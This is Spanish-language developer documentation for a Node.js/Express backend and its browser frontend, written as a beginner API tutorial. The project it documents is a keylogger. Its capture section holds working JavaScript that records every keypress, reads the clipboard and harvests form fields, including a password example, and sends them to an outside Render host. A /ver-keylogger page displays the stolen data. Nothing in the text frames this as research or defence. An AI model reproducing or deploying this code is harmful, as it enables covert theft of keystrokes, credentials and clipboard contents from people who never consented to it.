# 📚 Documentación Completa de las APIs

## 🎯 Introducción

Esta documentación te ayudará a entender completamente cómo funcionan las APIs de este proyecto. El backend está construido con **Node.js** y **Express**, un framework web minimalista y flexible.

## 🏗️ Arquitectura del Sistema

```
┌─────────────────────────────────────────────────────────────┐
│                      NAVEGADOR WEB                          │
│  (Frontend - HTML/JavaScript en Netlify)                    │
└────────────────────┬────────────────────────────────────────┘
                     │
                     │ HTTP Requests (GET/POST)
                     │ JSON Data
                     ▼
┌─────────────────────────────────────────────────────────────┐
│                   SERVIDOR EXPRESS                          │
│              (Backend - Node.js en Render)                  │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐  │
│  │  Middleware de CORS                                  │  │
│  │  (Permite requests desde cualquier origen)          │  │
│  └─────────────────────────────────────────────────────┘  │
│                           │                                 │
│  ┌─────────────────────────────────────────────────────┐  │
│  │  Rutas (Endpoints)                                   │  │
│  │  • GET  /          → Información del servidor        │  │
│  │  • GET  /health    → Estado del servidor             │  │
│  │  • POST /captura   → Guardar datos recibidos         │  │
│  │  • GET  /ver-keylogger → Visualizar datos            │  │
│  └─────────────────────────────────────────────────────┘  │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
            ┌─────────────────┐
            │   datos.txt     │
            │  (Almacenamiento)│
            └─────────────────┘
```

## 🔧 Tecnologías Utilizadas

### Backend
- **Node.js**: Entorno de ejecución de JavaScript en el servidor
- **Express**: Framework web para crear APIs REST
- **body-parser**: Middleware para procesar datos JSON
- **fs (File System)**: Módulo nativo para leer/escribir archivos

### Frontend
- **HTML5**: Estructura de las páginas
- **JavaScript (Fetch API)**: Para hacer peticiones HTTP al backend
- **CSS3**: Estilos visuales

## 📡 Explicación Detallada de los Endpoints

### 1. `GET /` - Información del Servidor

**Propósito**: Proporciona información básica sobre el servidor y los endpoints disponibles.

**Cómo funciona**:
```javascript
// En app.js líneas 25-38
app.get('/', (req, res) => {
  res.json({
    message: '✅ Backend funcionando correctamente',
    timestamp: new Date().toISOString(),
    server: 'backend-prueba',
    version: '2.0.0',
    endpoints: [...]
  });
});
```

**Ejemplo de uso**:
```bash
# Desde la terminal
curl https://backend-prueba-o523.onrender.com/

# Desde el navegador
fetch('https://backend-prueba-o523.onrender.com/')
  .then(res => res.json())
  .then(data => console.log(data));
```

**Respuesta esperada**:
```json
{
  "message": "✅ Backend funcionando correctamente",
  "timestamp": "2025-12-09T18:30:00.000Z",
  "server": "backend-prueba",
  "version": "2.0.0",
  "endpoints": [
    "GET /",
    "GET /health",
    "GET /ver-keylogger",
    "POST /captura"
  ]
}
```

**Cuándo usarlo**: Para verificar que el servidor está funcionando y conocer los endpoints disponibles.

---

### 2. `GET /health` - Estado del Servidor

**Propósito**: Endpoint de diagnóstico para monitorear la salud del servidor.

**Cómo funciona**:
```javascript
// En app.js líneas 41-49
app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    uptime: process.uptime(),      // Tiempo que lleva corriendo
    timestamp: new Date().toISOString(),
    memory: process.memoryUsage(), // Uso de memoria
    env: process.env.NODE_ENV || 'development'
  });
});
```

**Ejemplo de uso**:
```javascript
// Verificar el estado del servidor
fetch('https://backend-prueba-o523.onrender.com/health')
  .then(res => res.json())
  .then(data => {
    console.log('Servidor activo por:', data.uptime, 'segundos');
    console.log('Memoria usada:', data.memory.heapUsed / 1024 / 1024, 'MB');
  });
```

**Respuesta esperada**:
```json
{
  "status": "OK",
  "uptime": 3600.45,
  "timestamp": "2025-12-09T18:30:00.000Z",
  "memory": {
    "rss": 45678912,
    "heapTotal": 12345678,
    "heapUsed": 9876543,
    "external": 123456
  },
  "env": "production"
}
```

**Cuándo usarlo**: Para monitoreo continuo del servidor, verificar que no haya problemas de memoria o rendimiento.

---

### 3. `POST /captura` - Capturar y Guardar Datos

**Propósito**: Este es el endpoint principal que recibe datos desde el frontend y los guarda en un archivo.

**Cómo funciona paso a paso**:

```javascript
// En app.js líneas 52-78
app.post('/captura', async (req, res) => {
  try {
    // 1. Recibir los datos del cliente
    console.log('📥 Datos recibidos:', req.body);
    
    // 2. Agregar información adicional (timestamp, servidor)
    const data = JSON.stringify({
      ...req.body,
      timestamp: new Date().toISOString(),
      server: 'render'
    }) + '\n';
    
    // 3. Guardar en archivo datos.txt
    await fs.appendFile('./datos.txt', data);
    
    // 4. Responder al cliente que todo salió bien
    console.log('✅ Datos guardados correctamente');
    res.json({ 
      ok: true, 
      message: 'Datos guardados correctamente',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    // 5. Si hay error, informar al cliente
    console.error('❌ Error al guardar datos:', error);
    res.status(500).json({ 
      error: 'Error interno del servidor',
      message: error.message 
    });
  }
});
```

**Ejemplo de uso desde el Frontend**:

```javascript
// Ejemplo 1: Capturar una tecla presionada
document.addEventListener('keydown', async function(e) {
  const datos = {
    key: e.key,           // Tecla presionada
    code: e.code,         // Código de la tecla
    time: new Date().toISOString(),
    type: 'keylogger',
    source: 'frontend'
  };
  
  const response = await fetch('https://backend-prueba-o523.onrender.com/captura', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json' 
    },
    body: JSON.stringify(datos)
  });
  
  if (response.ok) {
    const resultado = await response.json();
    console.log('✅ Datos guardados:', resultado);
  }
});

// Ejemplo 2: Capturar datos de un formulario
async function capturarFormulario(event) {
  event.preventDefault();
  
  const datos = {
    usuario: document.getElementById('usuario').value,
    email: document.getElementById('email').value,
    type: 'formulario',
    timestamp: new Date().toISOString()
  };
  
  const response = await fetch('https://backend-prueba-o523.onrender.com/captura', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(datos)
  });
  
  const resultado = await response.json();
  console.log('Respuesta del servidor:', resultado);
}

// Ejemplo 3: Capturar datos del portapapeles
navigator.clipboard.readText().then(async (texto) => {
  const datos = {
    clipboard: texto,
    type: 'portapapeles',
    timestamp: new Date().toISOString()
  };
  
  await fetch('https://backend-prueba-o523.onrender.com/captura', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(datos)
  });
});
```

**Formato de datos que acepta**:
El endpoint acepta cualquier objeto JSON. Ejemplos:

```json
// Para keylogger
{
  "key": "a",
  "code": "KeyA",
  "time": "2025-12-09T18:30:00.000Z",
  "type": "keylogger"
}

// Para formularios
{
  "usuario": "juan123",
  "password": "mipassword",
  "email": "juan@example.com",
  "type": "formulario"
}

// Para portapapeles
{
  "clipboard": "texto copiado",
  "type": "portapapeles",
  "timestamp": "2025-12-09T18:30:00.000Z"
}
```

**Respuesta exitosa**:
```json
{
  "ok": true,
  "message": "Datos guardados correctamente",
  "timestamp": "2025-12-09T18:30:00.000Z"
}
```

**Respuesta en caso de error**:
```json
{
  "error": "Error interno del servidor",
  "message": "EACCES: permission denied, open './datos.txt'"
}
```

**Cuándo usarlo**: Cada vez que quieras enviar datos desde el frontend al backend para ser almacenados.

---

### 4. `GET /ver-keylogger` - Visualizar Datos Capturados

**Propósito**: Mostrar todos los datos que se han capturado y guardado en el archivo.

**Cómo funciona**:

```javascript
// En app.js líneas 81-202
app.get('/ver-keylogger', async (req, res) => {
  try {
    // 1. Leer el archivo datos.txt
    const data = await fs.readFile('./datos.txt', 'utf8');
    
    // 2. Generar una página HTML con los datos
    res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <title>Datos Capturados</title>
        <style>/* Estilos CSS */</style>
      </head>
      <body>
        <h1>Datos Capturados del Keylogger</h1>
        <pre>${data}</pre>
      </body>
      </html>
    `);
  } catch (error) {
    // 3. Si el archivo no existe, mostrar mensaje
    if (error.code === 'ENOENT') {
      res.send(/* HTML con mensaje "No hay datos aún" */);
    }
  }
});
```

**Ejemplo de uso**:

```javascript
// Abrir en una nueva ventana
window.open('https://backend-prueba-o523.onrender.com/ver-keylogger', '_blank');

// O como un botón HTML
<button onclick="window.open('https://backend-prueba-o523.onrender.com/ver-keylogger')">
  Ver Datos Capturados
</button>
```

**Qué muestra**: Una página HTML formateada con todos los datos guardados en formato JSON, línea por línea.

**Cuándo usarlo**: Para ver y revisar todos los datos que se han capturado a través del endpoint `/captura`.

---

## 🔄 Flujo Completo de una Petición

Veamos un ejemplo completo de cómo funciona el flujo cuando un usuario presiona una tecla:

```
┌──────────────────────────────────────────────────────────────────┐
│ PASO 1: Usuario presiona la tecla "A" en el navegador           │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 2: JavaScript detecta el evento                             │
│                                                                  │
│  document.addEventListener('keydown', function(e) {              │
│    // e.key = "a"                                                │
│    // e.code = "KeyA"                                            │
│  });                                                             │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 3: JavaScript crea un objeto con los datos                 │
│                                                                  │
│  const datos = {                                                 │
│    key: "a",                                                     │
│    code: "KeyA",                                                 │
│    time: "2025-12-09T18:30:00.000Z"                             │
│  };                                                              │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 4: Fetch API envía datos al servidor (HTTP POST)           │
│                                                                  │
│  POST https://backend-prueba-o523.onrender.com/captura          │
│  Content-Type: application/json                                  │
│  Body: {"key":"a","code":"KeyA","time":"2025-12-09..."}         │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 5: Express recibe la petición                              │
│                                                                  │
│  • Middleware CORS: Permite el request                           │
│  • express.json(): Convierte el body en objeto JavaScript       │
│  • Enrutador encuentra: app.post('/captura', ...)               │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 6: Handler del endpoint procesa los datos                  │
│                                                                  │
│  • Recibe: req.body = {key:"a", code:"KeyA", time:"..."}        │
│  • Agrega timestamp y servidor                                   │
│  • Convierte a JSON string                                       │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 7: Guarda datos en archivo                                 │
│                                                                  │
│  await fs.appendFile('./datos.txt', data);                      │
│                                                                  │
│  Contenido agregado a datos.txt:                                │
│  {"key":"a","code":"KeyA","time":"...","timestamp":"..."}       │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 8: Servidor responde al cliente                            │
│                                                                  │
│  res.json({                                                      │
│    ok: true,                                                     │
│    message: 'Datos guardados correctamente',                    │
│    timestamp: '2025-12-09T18:30:00.000Z'                        │
│  });                                                             │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ PASO 9: JavaScript recibe respuesta                             │
│                                                                  │
│  if (response.ok) {                                              │
│    console.log('✅ Datos guardados');                           │
│  }                                                               │
└──────────────────────────────────────────────────────────────────┘
```

## 🛠️ Middleware Explicado

### ¿Qué es un Middleware?

Un middleware es una función que se ejecuta **entre** que se recibe una petición y se envía una respuesta. Es como un "filtro" por el que pasa la petición.

```javascript
// Middleware de CORS
app.use((req, res, next) => {
  // 1. Agregar headers a la respuesta
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  
  // 2. Pasar al siguiente middleware o ruta
  next();
});
```

**¿Por qué es necesario CORS?**

Por seguridad, los navegadores no permiten que un sitio web (ej: papadelta2.netlify.app) haga peticiones a otro dominio (ej: backend-prueba-o523.onrender.com) a menos que el servidor lo autorice explícitamente. CORS (Cross-Origin Resource Sharing) es el mecanismo que permite esto.

Sin CORS, verías este error en la consola:
```
Access to fetch at 'https://backend-prueba-o523.onrender.com/captura' 
from origin 'https://papadelta2.netlify.app' has been blocked by CORS policy
```

## 📝 Conceptos Clave

### 1. HTTP Methods (Métodos HTTP)

- **GET**: Para OBTENER datos (leer)
  - Ejemplo: Ver la información del servidor, ver datos capturados
  - No modifica nada en el servidor
  
- **POST**: Para ENVIAR datos (crear/guardar)
  - Ejemplo: Enviar teclas capturadas, enviar datos de formulario
  - Modifica/crea información en el servidor

### 2. Request y Response

**Request (Petición)**: Lo que el cliente envía al servidor
```javascript
{
  method: 'POST',           // Método HTTP
  url: '/captura',          // Ruta/endpoint
  headers: {                // Cabeceras
    'Content-Type': 'application/json'
  },
  body: {                   // Cuerpo con datos
    key: 'a',
    code: 'KeyA'
  }
}
```

**Response (Respuesta)**: Lo que el servidor envía de vuelta
```javascript
{
  status: 200,              // Código de estado (200 = OK)
  headers: {                // Cabeceras
    'Content-Type': 'application/json'
  },
  body: {                   // Cuerpo con respuesta
    ok: true,
    message: 'Datos guardados correctamente'
  }
}
```

### 3. Códigos de Estado HTTP

- **200 OK**: Todo salió bien
- **404 Not Found**: La ruta no existe
- **500 Internal Server Error**: Error en el servidor

### 4. JSON (JavaScript Object Notation)

Es el formato usado para intercambiar datos entre frontend y backend:

```javascript
// Objeto JavaScript
const datos = { nombre: 'Juan', edad: 25 };

// Convertir a JSON string para enviar
const jsonString = JSON.stringify(datos);
// Resultado: '{"nombre":"Juan","edad":25}'

// Convertir de JSON string a objeto JavaScript
const objeto = JSON.parse(jsonString);
// Resultado: { nombre: 'Juan', edad: 25 }
```

## 🎓 Ejemplos Prácticos Completos

### Ejemplo 1: Crear tu propio endpoint

```javascript
// En app.js, agregar:
app.post('/mi-endpoint', async (req, res) => {
  try {
    // Obtener datos enviados por el cliente
    const { nombre, mensaje } = req.body;
    
    // Hacer algo con los datos
    console.log(`Recibido mensaje de ${nombre}: ${mensaje}`);
    
    // Responder al cliente
    res.json({
      ok: true,
      respuesta: `Hola ${nombre}, recibí tu mensaje: "${mensaje}"`
    });
  } catch (error) {
    res.status(500).json({
      error: 'Error procesando tu mensaje',
      detalles: error.message
    });
  }
});
```

### Ejemplo 2: Usar el endpoint desde JavaScript

```html
<!DOCTYPE html>
<html>
<head>
  <title>Test API</title>
</head>
<body>
  <input id="nombre" placeholder="Tu nombre">
  <input id="mensaje" placeholder="Tu mensaje">
  <button onclick="enviarMensaje()">Enviar</button>
  <div id="resultado"></div>

  <script>
    async function enviarMensaje() {
      const nombre = document.getElementById('nombre').value;
      const mensaje = document.getElementById('mensaje').value;
      
      // Enviar datos al servidor
      const response = await fetch('https://backend-prueba-o523.onrender.com/mi-endpoint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ nombre, mensaje })
      });
      
      // Obtener respuesta
      const data = await response.json();
      
      // Mostrar resultado
      document.getElementById('resultado').innerHTML = data.respuesta;
    }
  </script>
</body>
</html>
```

### Ejemplo 3: Testing con cURL

```bash
# Test GET /
curl https://backend-prueba-o523.onrender.com/

# Test POST /captura
curl -X POST https://backend-prueba-o523.onrender.com/captura \
  -H "Content-Type: application/json" \
  -d '{"key":"a","code":"KeyA","type":"test"}'

# Test GET /health
curl https://backend-prueba-o523.onrender.com/health
```

## 🔍 Debugging y Troubleshooting

### Ver logs del servidor

Los `console.log()` en app.js se pueden ver en los logs de Render:
```javascript
console.log('📥 Datos recibidos:', req.body);
console.log('✅ Datos guardados correctamente');
console.error('❌ Error al guardar datos:', error);
```

### Debugging en el navegador

```javascript
// Ver requests en la consola del navegador
fetch('https://backend-prueba-o523.onrender.com/captura', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ test: 'data' })
})
.then(response => {
  console.log('Status:', response.status);
  console.log('Headers:', response.headers);
  return response.json();
})
.then(data => {
  console.log('Respuesta:', data);
})
.catch(error => {
  console.error('Error:', error);
});
```

### Problemas comunes

1. **Error de CORS**: El servidor no acepta requests desde tu dominio
   - Solución: Verificar que el middleware de CORS esté configurado

2. **404 Not Found**: La ruta no existe
   - Solución: Verificar que el endpoint esté bien escrito

3. **500 Internal Server Error**: Error en el servidor
   - Solución: Ver los logs para encontrar el error específico

4. **Network Error**: No se puede conectar al servidor
   - Solución: Verificar que el servidor esté corriendo y la URL sea correcta

## 📚 Recursos Adicionales

- **Express.js**: https://expressjs.com/
- **Fetch API**: https://developer.mozilla.org/es/docs/Web/API/Fetch_API
- **Node.js**: https://nodejs.org/
- **HTTP Status Codes**: https://developer.mozilla.org/es/docs/Web/HTTP/Status
- **JSON**: https://developer.mozilla.org/es/docs/Web/JavaScript/Reference/Global_Objects/JSON

## 💡 Próximos Pasos

Para seguir aprendiendo, puedes:

1. Crear nuevos endpoints personalizados
2. Agregar validación de datos (verificar que los datos sean correctos)
3. Implementar autenticación (tokens, sesiones)
4. Conectar a una base de datos (MongoDB, PostgreSQL)
5. Agregar más logging y manejo de errores
6. Implementar rate limiting (limitar peticiones por IP)

---

**¿Preguntas?** Revisa el código en `app.js` y experimenta modificándolo. ¡La mejor forma de aprender es practicando!
